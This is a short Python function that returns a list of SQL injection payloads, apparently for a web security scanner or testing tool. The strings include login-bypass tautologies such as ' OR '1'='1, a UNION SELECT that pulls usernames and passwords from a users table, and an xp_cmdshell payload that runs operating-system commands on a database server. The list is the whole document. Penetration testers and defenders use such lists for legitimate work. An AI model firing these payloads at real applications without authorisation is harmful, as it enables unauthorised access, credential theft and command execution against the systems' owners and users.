
def get_payloads():
    return [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT NULL, username, password FROM users --",
        "' AND 1=0 UNION SELECT NULL, 'admin', 'pass' --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1#"
    ]
